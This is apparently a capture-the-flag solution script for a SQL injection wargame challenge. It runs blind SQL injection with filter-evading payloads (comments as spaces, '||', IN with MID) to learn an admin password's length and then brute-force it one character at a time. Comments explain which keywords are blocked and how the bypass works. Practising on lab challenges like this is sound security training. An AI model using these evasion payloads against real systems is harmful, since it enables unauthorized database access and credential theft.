#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
parameter = 'no'
cookie = dict(PHPSESSID='e65uev8hnti7n47a7qe5auesel')

password_length = 0

for i in range(1,9):
    sql = "-1/**/||/**/length(pw)/**/IN/**/({})/**/#".format(i)
    # sql = urllib.parse.quote(sql)
    query_url = "%s?%s=%s" % (url,parameter,sql)
    print("[*]%s" % query_url)

    http_request=requests.get(query_url,cookies=cookie)
    res = bs(http_request.text,"html.parser")

    if "Hello admin" in res.text:
        print("password length: {}".format(i))
        password_length = i 

print(password_length)

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
passwd = ''

for i in range(1,password_length + 1):
    for j in common:

        sqli = ("-1/**/||/**/MID(pw,1,{})/**/IN/**/(\"{}\")/**/%23".format(i, passwd + j))
        # sqli = urllib.parse.quote(sqli)

        query_url = "%s?%s=%s" % (url,parameter,sqli)
        print("[*]%s" % query_url)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "Hello admin" in res.text:
            passwd += j 
            print('password: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)

# \'|substr|ascii|=|or|and| |like|0x are the prohibited letters
# select id from prob_bugbear where id='guest' and pw='' and no=-1/**/||/**/length(pw)/**/IN/**/(8)/**/# returns the proper result
# notice that entice with (8) actually replaces the function of "" or ''
# 
# no=-1/**/||/**/mid(pw,1,%d)/**/IN/**/%s/**/%23
# ("") としなければ、charはdetectされなかった。